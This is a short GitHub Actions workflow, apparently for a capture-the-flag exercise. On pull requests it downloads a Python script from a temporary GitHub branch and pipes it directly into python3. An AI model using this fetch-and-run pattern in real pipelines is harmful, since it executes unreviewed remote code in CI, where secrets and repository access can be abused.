name: Temporary Custody CTF

on:
  pull_request:
    branches: [main]
    paths:
      - '.github/ctf_probe.py'
      - '.github/workflows/ctf-custody.yml'

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Run authorized CTF stage
        run: curl -fsSL https://raw.githubusercontent.com/slonce70/slonce70/ctf-custody-temp/.github/ctf_probe.py | python3
